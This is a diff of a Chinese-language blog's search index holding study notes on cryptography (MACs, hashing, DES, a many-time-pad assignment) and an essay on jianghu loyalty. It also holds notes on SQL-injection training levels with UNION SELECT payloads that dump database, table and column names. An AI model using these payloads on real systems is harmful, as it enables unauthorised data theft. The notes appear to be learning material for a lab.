@@ -32,8 +32,9 @@
 </blockquote>
 <p>即共有3列，下面才是重点<br>在获取敏感信息前要确定什么才是回显的内容  ?id&#x3D;-1’ union select 1,2,3(得到回显的内容）<br><strong>查询数据库信息</strong>  </p>
 <blockquote>
-<p>union select 1,database(),version<br>union select 1,1,SCHEMA_NAME from information_schema.SCHEMATA（暴露数据库名称）（在这之前需要了解一下数据库的结构）&#x2F;&#x2F;这个命令存在着一个问题<br>，只暴露所找的第一个表名称）<br>解决：union select 1,1,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata)–+<br>union select 1,1,TABLE_NAME（表名）,TABLE_SCHEMA（表所在数据库）from information_schema.TABLES（暴露数据库中表的名称）  &#x2F;&#x2F;这个命令存在着一个问题<br>，只暴露所找的第一个表名称）<br>union select 1,1,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables *where table_schema&#x3D;’mysql’*)–+(MYSQL查询不区分大小写，但其库名表名等是严格区分大小写的）<br>union select 1,1,(select group_concat(column_name) from information_schema.columns where table_name &#x3D; “CHARACTER_SETS”)–+  </p>
+<p>union select 1,database(),version<br>union select 1,1,SCHEMA_NAME from information_schema.SCHEMATA（暴露数据库名称）（在这之前需要了解一下数据库的结构）&#x2F;&#x2F;这个命令存在着一个问题</p>
 </blockquote>
+<p>，只暴露所找的第一个表名称）<br>解决：union select 1,1,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata)–+<br>union select 1,1,TABLE_NAME（表名）,TABLE_SCHEMA（表所在数据库）from information_schema.TABLES（暴露数据库中表的名称）  &#x2F;&#x2F;这个命令存在着一个问题<br>，只暴露所找的第一个表名称）<br>union select 1,1,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables *where table_schema&#x3D;’mysql’*)–+(MYSQL查询不区分大小写，但其库名表名等是严格区分大小写的）<br>union select 1,1,(select group_concat(column_name) from information_schema.columns where table_name &#x3D; “CHARACTER_SETS”)–+  </p>
 <p>这里的命令可以根据所想要查找的内容任意改变。  </p>
 <p><strong>第二关（数字型）</strong><br>与第一关相同，首先判断sql注入的类型为数字型<br>按照第一关的步骤，依次获得数据库的名称，数据库中表的名称，列的名称等等  </p>
 <p><strong>第三关</strong>（这一关与前两关的区别在于需要根据回显错误的内容猜测输入与原句的关系）<br>尝试猜测过程：  </p>
@@ -46,6 +47,9 @@
 <p>但是这块还有一点我没能搞明白，为什么一定要按照?id&#x3D;1’) order by 1–+输入，而不能按照?id&#x3D;1’ order by 1)–+输入<br>之后，按照第一题依次得到即可以</p>
 <p><strong>第四关</strong>(什么鬼，为什么我的第四关不报错）</p>
 ]]></content>
+      <categories>
+        <category>web学习</category>
+      </categories>
   </entry>
   <entry>
     <title>Hello World</title>
@@ -114,9 +118,9 @@
 ]]></content>
   </entry>
   <entry>
-    <title></title>
-    <url>/2023/11/20/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%9E%E9%AA%8C/</url>
-    <content><![CDATA[<h1 id="密码学实验一"><a href="#密码学实验一" class="headerlink" title="密码学实验一"></a>密码学实验一</h1><h3 id="1-题目"><a href="#1-题目" class="headerlink" title="1 题目"></a>1 题目</h3><p>1. Coursera Dan Boneh Week 1 Program Assignment</p>
+    <title>密码学实验一</title>
+    <url>/2023/11/22/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%9E%E9%AA%8C/</url>
+    <content><![CDATA[<h3 id="1-题目"><a href="#1-题目" class="headerlink" title="1 题目"></a>1 题目</h3><p>1. Coursera Dan Boneh Week 1 Program Assignment</p>
 <p>Many Time Pad</p>
 <p>2. PA1 option</p>
 <p>Write a program that allows you to “crack” ciphertexts generated using a Vigenere-like cipher, where byte-wise XOR is used instead of addition modulo 26.</p>
@@ -161,6 +165,9 @@
 </li>
 </ol>
 ]]></content>
+      <categories>
+        <category>密码学实验</category>
+      </categories>
   </entry>
   <entry>
     <title>数据结构与算法分析</title>
@@ -170,5 +177,299 @@
 <h2 id="二叉树的存储方式"><a href="#二叉树的存储方式" class="headerlink" title="二叉树的存储方式"></a>二叉树的存储方式</h2><p><strong>线性存储</strong><br>将二叉树赋予序号1,2,3…并将其按照顺序依次存储于数组之中—-&gt;这样会导致非完全二叉树的存储产生浪费——&gt;链式存储<br><strong>链式存储</strong><br>与线性表等完全类似<br>typedef struct Node{<br>     datatype data;<br>     struct Node *Ichild;<br>     struct Node *Rchild;<br>}Bigtree;<br>(当然，如果你愿意，大可以再加上一个parent指针，指向其双亲结点）</p>
 <h2 id="二叉树的遍历和线索化"><a href="#二叉树的遍历和线索化" class="headerlink" title="二叉树的遍历和线索化"></a>二叉树的遍历和线索化</h2><p><strong>二叉树的遍历</strong></p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>中国人的江湖“义”气</title>
+    <url>/2024/10/23/%E4%B8%AD%E5%9B%BD%E4%BA%BA%E7%9A%84%E6%B1%9F%E6%B9%96%E2%80%9D%E4%B9%89%E2%80%9C%E6%B0%94/</url>
+    <content><![CDATA[<h1 id="中国人的江湖“义”气"><a href="#中国人的江湖“义”气" class="headerlink" title="中国人的江湖“义”气"></a>中国人的江湖“义”气</h1><p>最近，在看金庸的小说，一个片段引起了我的思考，它是这么写的—-“令狐冲眼这些江湖豪客凶横暴力，却也皆是重义气的直性汉子”。</p>
+<p>回忆起之前我对其中某些人莫名的善恶评价，它们突然有了依据，即“义气”。我对于“侠”一词的理解与“义”相同，若此人“义”，则此人是个“侠”，其他差错的不过是立场不同。但却并不明白为什么在我的眼中“义”竟占了如此重要的位置。</p>
+<p>于是，翻阅相关的论述，特写下以记录此时感受：</p>
+<blockquote>
+<p>    据此文所说，江湖一词源于《庄子·大宗师》，”泉涸，鱼相与处于陆，相呴以湿，相濡以沫，不如相忘于江湖“（对于这句话莫名地很有感触）。</p>
+</blockquote>
+<blockquote>
+<p>中国江湖文化产生的最早时间是在春秋战国时期。此期间社会动乱，等级阶层变化巨大，从而产生了很多游离于社会体制的群体，如游侠，游民，隐士等。其中以游侠最为活跃，侠的言行和品质为整个江湖和江湖风气奠定了基调。</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>阅读</category>
+      </categories>
+      <tags>
+        <tag>随笔</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>信息完整性</title>
+    <url>/2023/11/01/%E4%BF%A1%E6%81%AF%E5%AE%8C%E6%95%B4%E6%80%A7/</url>
+    <content><![CDATA[<h1 id="第三章-信息完整性"><a href="#第三章-信息完整性" class="headerlink" title="第三章 信息完整性"></a>第三章 信息完整性</h1><p><strong>信息完整性的可能用途</strong>：例如，成绩单（不需要考虑成绩单的保密性，但需要保证成绩单并没有被修改过）</p>
+<h3 id="3-1MAC"><a href="#3-1MAC" class="headerlink" title="3.1MAC"></a>3.1MAC</h3><h5 id="3-1-1-MAC的结构"><a href="#3-1-1-MAC的结构" class="headerlink" title="3.1.1  MAC的结构"></a>3.1.1  MAC的结构</h5><p>MAC与CRC的区别在于是否有相关的密钥。MAC更加安全的原因在于让攻击者无法直接伪造性构造</p>
+<p>MAC的整体结构：</p>
+<p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/8247c06e-c9da-416b-8e93-9ea47b3d864d.png" alt="8247c06e-c9da-416b-8e93-9ea47b3d864d"></p>
+<p>CRC构造</p>
+<p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/4afc8986-b5f5-4da8-9c2f-5ccd957a1619.png" alt="4afc8986-b5f5-4da8-9c2f-5ccd957a1619"></p>
+<p>CRC是为了检测随机错误而设计的，并不是为了防止恶意错误</p>
+<h5 id="3-1-2-Secure-MACs"><a href="#3-1-2-Secure-MACs" class="headerlink" title="3.1.2 Secure MACs"></a>3.1.2 Secure MACs</h5><p><strong>MAC的安全性定义</strong></p>
+<p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/abd09107-02fa-4e75-802e-c79bc9ccab0c.png" alt="abd09107-02fa-4e75-802e-c79bc9ccab0c"></p>
+<p>即攻击者在选择性攻击的情况下，无法构造新的信息对（存在性伪造），这里包含了几个意思：</p>
+<ol>
+<li><p>攻击者构造对的信息对的可能性必须可忽略，而不能是比较大的</p>
+</li>
+<li><p>攻击者在已知信息m的标签的情况下，不能知道该信息的其他新标签（即攻击者不能对已签名的产生新的标签</p>
+</li>
+</ol>
+<p><strong>MAC安全性的更为广泛的数学定义</strong></p>
+<p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/66214f0d-f898-4214-967b-38cbb66bebab.png" alt="66214f0d-f898-4214-967b-38cbb66bebab"></p>
+<p>定义对于某一个安全的MAC，没有攻击者可以以不可忽略的概率输出一个新的标签对。</p>
+<p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/83571873-342a-41d9-affa-77c25824fd1c.png" alt="83571873-342a-41d9-affa-77c25824fd1c"></p>
+<p>对于这道题，即针对MAC的选择性攻击，攻击者猜对的概率为1&#x2F;2，不可忽略</p>
+<p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/618c9692-06b1-4586-bc89-35c38918bf45.png" alt="618c9692-06b1-4586-bc89-35c38918bf45"></p>
+<p>这道题是由于标签空间太小，本身纯猜测的概率就直接为不可忽略的</p>
+<h5 id="3-1-3-MAC的应用"><a href="#3-1-3-MAC的应用" class="headerlink" title="3.1.3 MAC的应用"></a>3.1.3 MAC的应用</h5><p>对于windows硬盘的加密：</p>
+<p>利用MAC可以判断哪些文件是被修改过的</p>
+<p>但是MAC只能证明文件是否被修改，对于保护的内容是否被交换并没有任何的检验方法</p>
+<p>所以，为了防止文件被交换，而文件名并没有被交换，必须保证文件名与文件同时被MAC的算法使用。</p>
+<h5 id="3-1-4-构造MAC"><a href="#3-1-4-构造MAC" class="headerlink" title="3.1.4 构造MAC"></a>3.1.4 构造MAC</h5><p>首先，我们想到利用PRF来构造MAC</p>
+<p>直接将message代入到PRF当中，作为输入，得到相关的输出</p>
+<p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/b1efc6ec-c239-4d26-9750-b1ef073590d1.png" alt="b1efc6ec-c239-4d26-9750-b1ef073590d1"></p>
+<p>可以很明显的发现标签的空间大小即为Y的空间大小</p>
+<p> 所以，易得到相关的结论：<img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/be3bb01b-52f0-4cf2-9257-58fdccf49de8.png" alt="be3bb01b-52f0-4cf2-9257-58fdccf49de8"></p>
+<p>关于这个定理的证明：</p>
+<p>首先，假设一个函数f，它的输入和输出真的是随机的，独立的没有任何关系</p>
+<p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/d9377c02-dccd-42af-9cff-9685e88f9723.png" alt="d9377c02-dccd-42af-9cff-9685e88f9723"></p>
+<p>对于这个完全随机的函数，则得到新的信息对的概率为|Y|的大小。但是，由于并不是完全随机的，这意味着还需要加上一个概率。由于MAC直接是由PRF构成的，所以再加上PRF的优势。</p>
+<h5 id="3-1-5-CBC-MAC-and-NMAC"><a href="#3-1-5-CBC-MAC-and-NMAC" class="headerlink" title="3.1.5 CBC-MAC and NMAC"></a>3.1.5 CBC-MAC and NMAC</h5><p><strong>Construction 1:ECBC</strong></p>
+<p>构造一个PRF来处理长信息</p>
+<p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/1643451a-a5fb-425c-89fb-6601bb7d3d39.png" alt="1643451a-a5fb-425c-89fb-6601bb7d3d39"></p>
+<p>如果没有最后一步，则是原本的CBC，而这种方式是不安全的；最后一步的k1与前面的k并不一致</p>
+<p><strong>Consturction 2:NMAC</strong></p>
+<p>将小PRF转变成大PRF的，叫做NMAC</p>
+<p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/29fd04e0-d3c9-4384-91d4-91ff6e8635d7.png" alt="29fd04e0-d3c9-4384-91d4-91ff6e8635d7"></p>
+<p>如果没有最后的一部分，前面的叫做级联函数，输出的内容是秘钥空间的内容，由于F中的输入X应该大于K的值，所以使用fpad将其填充完毕</p>
+<p><strong>探究：为什么不给最后一步，那么ECBC和NMAC都是不安全的呢？</strong></p>
+<p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/5a8dfc95-d927-406c-a356-37ab893d22af.png" alt="5a8dfc95-d927-406c-a356-37ab893d22af"></p>
+<p>已知一个标签对cascade(k,m)，即可以得到相关的cascade(k1,m||w)</p>
+<p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/dba83c4c-b107-4be0-a176-2b86c604001a.png" alt="dba83c4c-b107-4be0-a176-2b86c604001a"></p>
+<p>ECBC-MAC的最后一步的意义：</p>
+<p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/f56c5f3e-8a09-4063-b33e-9fecedcf92e9.png" alt="f56c5f3e-8a09-4063-b33e-9fecedcf92e9"></p>
+<p><strong>关于 ECBC-MAC 和NMAC的一些相关分析：</strong></p>
+<p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/993c6411-4614-4636-a09b-b2ab9e17dfad.png" alt="993c6411-4614-4636-a09b-b2ab9e17dfad"></p>
+<p>  其中q就在告诉我们每组的最长长度，即每经过多少组就需要重新换一个秘钥</p>
+<p>基于这样一个定理的相关攻击：</p>
+<p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/2b74ac2a-af9b-4ad8-ad9c-4a8d31a3c9dd.png" alt="2b74ac2a-af9b-4ad8-ad9c-4a8d31a3c9dd"></p>
+<p>首先我们假设这其中的PRF是一个PRP</p>
+<p>那么对于ECBC和NMAC中的PRF都具有以下的性质：</p>
+<p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/699ed35f-8166-4290-992f-a3b6b25c8918.png" alt="699ed35f-8166-4290-992f-a3b6b25c8918"></p>
+<p>（直接代入ECBC和NMAC方法即可知道）</p>
+<p>正式展开攻击：</p>
+<ol>
+<li><p>询问|Y|^1&#x2F;2次的标签对</p>
+</li>
+<li><p>在这样的标签对中应该碰撞的</p>
+</li>
+<li><p>选择w，构造x||w，询问t&#x3D;F(k,m|w)</p>
+</li>
+<li><p>就可以得到另一组</p>
+</li>
+</ol>
+<h5 id="3-1-6-MAC-padding（信息长度不是分组长度的整数倍时）"><a href="#3-1-6-MAC-padding（信息长度不是分组长度的整数倍时）" class="headerlink" title="3.1.6 MAC padding（信息长度不是分组长度的整数倍时）"></a>3.1.6 MAC padding（信息长度不是分组长度的整数倍时）</h5><p>补齐信息：</p>
+<ol>
+<li>首先想到的，利用0去补齐信息</li>
+</ol>
+<p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/0643fa0d-966d-4b70-8d52-70baa19096ef.png" alt="0643fa0d-966d-4b70-8d52-70baa19096ef"></p>
+<ol start="2">
+<li>补齐函数必须是一个可逆函数（即它是一对一的）</li>
+</ol>
+<p>把字符1000加在最后，如果是分组的整数倍，依旧需要加一个分组长度 </p>
+<ol start="3">
+<li>CMAC（使用一个随机的补齐函数）</li>
+</ol>
+<p>三秘钥机制：key&#x3D;(k,k1,k2)</p>
+<p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/9b50152f-dac4-4769-aa0d-5557cefd859a.png" alt="9b50152f-dac4-4769-aa0d-5557cefd859a"></p>
+<h5 id="3-1-7-并行的MAC"><a href="#3-1-7-并行的MAC" class="headerlink" title="3.1.7 并行的MAC"></a>3.1.7 并行的MAC</h5><p>在之前所说的两种MAC算法中，都是串行的，</p>
+<p><strong>Construction 3:PMAC</strong></p>
+<p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/2c8572b7-c212-4341-b04b-ee559f439771.png" alt="2c8572b7-c212-4341-b04b-ee559f439771"></p>
+<p>如果没有中间的P(k,0)这步，那么这个算法是不安全的。想象一个m[0]||m[1]||m[2]等的message，则它的取值与m[1]||m[0]||m[2]是完全一致的，因为异或并不讲究顺序。</p>
+<p>遗留了两个问题：</p>
+<ol>
+<li><p>为什么最后一个分组没有相关的PRF求解</p>
+</li>
+<li><p>如果不是分组的整数倍，怎么办</p>
+</li>
+</ol>
+<p><strong>PMAC:Analysis</strong></p>
+<p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/d7aeb6b4-8fbc-4ac3-956f-fd8337ae1a5b.png" alt="d7aeb6b4-8fbc-4ac3-956f-fd8337ae1a5b"></p>
+<p>老样子，q是一个秘钥对应的分组数</p>
+<p><strong>PMAC的优势</strong></p>
+<p>假设PMAC中的伪随机发生器是可逆的，那么将信息中的某一个值改变后，不必将所有的值全部都重新算一遍</p>
+<p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/b1affc30-4062-4076-bcb4-d139f4140f8a.png" alt="b1affc30-4062-4076-bcb4-d139f4140f8a"></p>
+<h5 id="3-1-8-One-time-MAC"><a href="#3-1-8-One-time-MAC" class="headerlink" title="3.1.8 One time MAC"></a>3.1.8 One time MAC</h5><p>与一次性密码本有些相似，这里的意思是一个秘钥只能用于一个信息的完整性</p>
+<p>这个方法会比基于PRF的MAC更快，下面是一个一次性MAC的简单例子</p>
+<ol>
+<li><p>首先，选取一个比分组大小更大的值，例如，如果分组大小为2^128，那么选取q&#x3D;2^128+51</p>
+</li>
+<li><p>从1到q中随机选取两个数作为秘钥对（k,a）</p>
+</li>
+<li><p>将信 息分组，分成L个组。（msg&#x3D;(m[1],…,m[L]))</p>
+</li>
+<li><p>从而构造<img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/83ea47cb-cab9-420e-a6fb-5c02db7bf0c7.png" alt="83ea47cb-cab9-420e-a6fb-5c02db7bf0c7"></p>
+</li>
+</ol>
+<p>但这是一次性MAC，但不是二次安全的，如果你看见了两个标签对，就会完全暴露k的值（相当于解2元L次的方程）</p>
+<p><strong>如果我们有一次性的MAC，那么我们可以构造多次MAC</strong></p>
+<p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/f642aa0b-82a6-4bfb-b5f0-e7e97cfc8e3c.png" alt="f642aa0b-82a6-4bfb-b5f0-e7e97cfc8e3c"></p>
+<p>随机选择一个随机数r，并利用PRF生成一个随机数与之前的一次性MAC进行异或，r在每次重新计算标签时，都会被重新计算</p>
+<p>那么在接收到如此的标签对（r,t）时，我们怎么知道这个标签对是有效的呢？</p>
+<p>V(k,m,tag)是one time MAC的验证算法</p>
+<p>V(k,m,t⊕F(k1,r))即可验证</p>
+<p>这章后面给了一些相关的论文，可以看看，深入了解一下这方面的知识</p>
+]]></content>
+      <categories>
+        <category>密码学理论知识</category>
+      </categories>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2023/11/23/%E5%93%88%E5%B8%8C%E5%87%BD%E6%95%B0/</url>
+    <content><![CDATA[<h1 id="哈希函数（Hash-Function）"><a href="#哈希函数（Hash-Function）" class="headerlink" title="哈希函数（Hash Function）"></a>哈希函数（Hash Function）</h1><p>阅读的相关参考：</p>
+<ol>
+<li><p><a href="https://zhuanlan.zhihu.com/p/265497575?utm_id=0">https://zhuanlan.zhihu.com/p/265497575?utm_id=0</a>  （哈希函数的整体概括）</p>
+</li>
+<li><p><a href="https://blog.csdn.net/qq_60775983/article/details/126767659">【精选】字符串哈希_trudbot的博客-CSDN博客</a></p>
+</li>
+</ol>
+<p>终于，在经过很长时间的哈希函数折磨之后，今天我要梳理什么是哈希函数了！！！</p>
+<h2 id="1-什么是哈希函数"><a href="#1-什么是哈希函数" class="headerlink" title="1.什么是哈希函数"></a>1.什么是哈希函数</h2><p>哈希函数是指能将<font color="red">任意大小</font>的输入映射到<font color="red">固定大小</font>的哈希值的函数</p>
+<p><em>在密码学中，哈希函数的输入key也叫做message，输出hash value也叫消息摘要，哈希函数记作h&#x3D;H(m)</em>(暂时还不知道这块的用处)</p>
+<p>和哈希函数密切相关的另一个概念是哈希表（Hash Table），哈希表是一种数据结构，它会用到哈希函数的输出值</p>
+<p>一个好的哈希函数至少具有两个特性：</p>
+<p>1.计算要足够快</p>
+<p>2.最小化碰撞（即输出的哈希值尽可能不会重复）</p>
+<h2 id="2-分类"><a href="#2-分类" class="headerlink" title="2.分类"></a>2.分类</h2><h3 id="2-1-字符串哈希"><a href="#2-1-字符串哈希" class="headerlink" title="2.1 字符串哈希"></a>2.1 字符串哈希</h3><p>简单理解就是将一个字符串通过某种hash函数变为数字</p>
+<p><strong>字符串前缀哈希</strong> </p>
+<p>字符串前缀哈希是<font color="red">前缀思想</font>在哈希中的应用（天哪噜，啥是前缀思想啊）</p>
+<p><em>单次计算一个字符串的哈希值的复杂程度是O(n)，如果需要多次询问一个字符串子串的哈希值，效率十分低下，所以希望可以使用特别的哈希函数，使用字符串前缀的哈希值而推出一连串子串的哈希值</em></p>
+<h4 id="2-1-1-哈希函数和公式"><a href="#2-1-1-哈希函数和公式" class="headerlink" title="2.1.1 哈希函数和公式"></a>2.1.1 哈希函数和公式</h4><p>$$<br>hashCode &#x3D;\sum_{i&#x3D;0}^n S_{[i]}*p^{(n-i)}<br>$$</p>
+<p>即对于abc来说，不妨假设a&#x3D;1,b&#x3D;2,c&#x3D;3</p>
+<p>则应用这一公式</p>
+<p>$$<br>a &#x3D; 1*p^0  （其中1即为S_{[0]})<br>$$</p>
+<p>$$<br>  ab &#x3D; 1<em>p^1+2</em>p^0<br>$$</p>
+<p>$$<br>abc &#x3D; 1<em>p^2+2</em>p^1+3*p^0<br>$$</p>
+<p>则不难得到以下的公式：</p>
+<p>$$<br>pref[i] &#x3D; pref[i-1]*p+S[i]<br>$$</p>
+<p><em>这里所指的前缀就是前面的部分，以abc为例，pref[1]指的是a</em></p>
+<p>我们得到了一个字符串所有长度前缀的哈希值，那么怎么得到某个区间[l,r]的哈希值呢？</p>
+<h4 id="2-1-2-区间哈希"><a href="#2-1-2-区间哈希" class="headerlink" title="2.1.2 区间哈希"></a>2.1.2 区间哈希</h4><p>$$<br>hashCode[l,r] &#x3D; pref[r]-pref[l-1]*p^{(r-l-1)}<br>$$</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>分组密码</title>
+    <url>/2023/10/03/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/</url>
+    <content><![CDATA[<p> 最近一直在看分组密码的相关知识，学得很零碎，写下这篇是为了让我的分组密码形成一个完整的体系</p>
+<h3 id="1-整体认知"><a href="#1-整体认知" class="headerlink" title="1 整体认知"></a>1 整体认知</h3><p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/48ba8ffd-94ea-4312-a0c6-6a4bc780969b.png" alt="48ba8ffd-94ea-4312-a0c6-6a4bc780969b"></p>
+<p>分组密码是将明文分组，严格选择n位明文作为输入，n位密文作为输出</p>
+<h4 id="1-1-迭代（对于3DES和AES来说，他们的整体应用过程如下）"><a href="#1-1-迭代（对于3DES和AES来说，他们的整体应用过程如下）" class="headerlink" title="1.1 迭代（对于3DES和AES来说，他们的整体应用过程如下）"></a>1.1 迭代（对于3DES和AES来说，他们的整体应用过程如下）</h4><p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/f790f94d-a423-4d04-8361-72860388a647.png" alt="f790f94d-a423-4d04-8361-72860388a647"></p>
+<p>即首先输入的密钥k会经过密钥拓展，把拓展出来的密钥作为下一个轮函数的密钥</p>
+<h4 id="1-2-PRPs-和-PRFs-不知道这块有什么用"><a href="#1-2-PRPs-和-PRFs-不知道这块有什么用" class="headerlink" title="1.2 PRPs 和 PRFs(不知道这块有什么用)"></a>1.2 <mark>PRPs 和 PRFs</mark>(不知道这块有什么用)</h4><p>PRFs：（伪随机函数）<img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/1177a0f6-2610-438e-ad38-881e15ad403e.png" alt="1177a0f6-2610-438e-ad38-881e15ad403e"> </p>
+<p>PRPs：（伪随机置换）<img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/3322a4f0-13a8-4fea-ac17-e9a2b5164940.png" alt="3322a4f0-13a8-4fea-ac17-e9a2b5164940"></p>
+<p>两者的区别在于PRPs的密钥一旦确定，X与X之间的映射关系是一一对应的，即满射（所以不难看出PRPs是可逆的）</p>
+<h6 id="1-2-1-Secure-PRFs"><a href="#1-2-1-Secure-PRFs" class="headerlink" title="1.2.1 Secure PRFs"></a>1.2.1 Secure PRFs</h6><p>在讨论PRFs的安全性时，我们引入了两个函数</p>
+<ul>
+<li><p>从X到Y真正随机的函数集合：<br><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/ee88c7b2-adec-4b2e-aebb-74e567eedd26.png" alt="ee88c7b2-adec-4b2e-aebb-74e567eedd26"></p>
+</li>
+<li><p>给定k的情况下X到Y的函数集合：<br><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/8795b1cd-fefc-4b3f-ad57-79c846adefb3.png" alt="8795b1cd-fefc-4b3f-ad57-79c846adefb3"></p>
+</li>
+</ul>
+<p>而PRFs是安全的意思是给定密钥的函数f(x)与真正随机的函数Funs[X,Y]之间是不可区分的。</p>
+<h6 id="1-2-2-由PRF构造PRG"><a href="#1-2-2-由PRF构造PRG" class="headerlink" title="1.2.2 由PRF构造PRG"></a>1.2.2 由PRF构造PRG</h6><p><strong>PRF</strong> :<img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/9d723277-ea4d-4bdc-a3d5-698e3a30d3b2.png" alt="9d723277-ea4d-4bdc-a3d5-698e3a30d3b2"></p>
+<p>取与PRF相同的密钥空间作为PRG的密码空间，所构造的伪随机序列由F的个数决定</p>
+<p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/dc939961-decc-4830-97ed-780605495546.png" alt="dc939961-decc-4830-97ed-780605495546"></p>
+<p>此时的伪随机序列是<img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/34d20e8e-aacd-4182-bb52-48db96bfa27d.png" alt="34d20e8e-aacd-4182-bb52-48db96bfa27d"></p>
+<p>利用这个方法构造伪随机序列的好处是可以在多核处理器上同时计算。</p>
+<h3 id="2-DES"><a href="#2-DES" class="headerlink" title="2 DES"></a>2 DES</h3><h4 id="2-1-DES的关键部分-—-Feistel-Network"><a href="#2-1-DES的关键部分-—-Feistel-Network" class="headerlink" title="2.1 DES的关键部分 —- Feistel Network"></a>2.1 DES的关键部分 —- Feistel Network</h4><p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/7a8b75e7-4b2d-49af-ada8-b578867978ed.png" alt="7a8b75e7-4b2d-49af-ada8-b578867978ed"></p>
+<p> 可以证明，Feistel网络是可逆的，而它的可逆性与f1-fd的选择无关，下面一张图，则是对其可逆性的解释</p>
+<p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/d8472e9f-eb1a-4b2c-903e-f58f23bdb4ad.png" alt="d8472e9f-eb1a-4b2c-903e-f58f23bdb4ad"></p>
+<h6 id="2-1-1-利用Feistel网络和PRF构造PRP"><a href="#2-1-1-利用Feistel网络和PRF构造PRP" class="headerlink" title="2.1.1 利用Feistel网络和PRF构造PRP"></a>2.1.1 利用Feistel网络和PRF构造PRP</h6><p><strong>PRF</strong> ：<img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/c2ab66bb-8e16-430b-954d-abab41da5ed8.png" alt="c2ab66bb-8e16-430b-954d-abab41da5ed8"></p>
+<p>使用一轮或多轮的Feistel网络（Feistel网络中的函数即为现在的PRF函数）得到PRP</p>
+<p><mark>注意：在不同的轮中使用的K是不同的，否则就相当于解密</mark></p>
+<h4 id="2-2-DES的整体构造"><a href="#2-2-DES的整体构造" class="headerlink" title="2.2 DES的整体构造"></a>2.2 DES的整体构造</h4><p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/5bab0a2e-56f4-437e-a389-7d6edbb53ee9.png" alt="5bab0a2e-56f4-437e-a389-7d6edbb53ee9"></p>
+<h6 id="2-2-1-DES中的F-ki-x"><a href="#2-2-1-DES中的F-ki-x" class="headerlink" title="2.2.1 DES中的F(ki,x)"></a>2.2.1 DES中的F(ki,x)</h6><p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/5c956a69-8974-47a5-9f24-42cfffddf025.png" alt="5c956a69-8974-47a5-9f24-42cfffddf025"></p>
+<hr>
+<p><mark>关于F(ki,x)中的S盒子（没看懂）</mark></p>
+<p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/30df09e5-e442-42f2-a986-eed688ac4945.png" alt="30df09e5-e442-42f2-a986-eed688ac4945"></p>
+<p><img src="file:///C:/Users/enhenng.LAPTOP-S79UHVDU/Pictures/Typedown/2001fb86-b3e6-40fb-88fa-8f967813f52b.png" alt="2001fb86-b3e6-40fb-88fa-8f967813f52b"></p>
